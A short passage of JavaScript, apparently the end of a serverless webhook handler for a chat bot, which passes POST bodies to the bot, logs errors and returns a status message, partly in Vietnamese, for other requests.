            await bot.handleUpdate(req.body);
            res.status(200).json({ status: 'ok' });
        } catch (error) {
            console.error('Bot Error:', error);
            res.status(200).json({ status: 'error' });
        }
    } else {
        res.status(200).json({ status: 'Bot is running!', message: 'Gửi POST request để dùng webhook.' });
    }
}
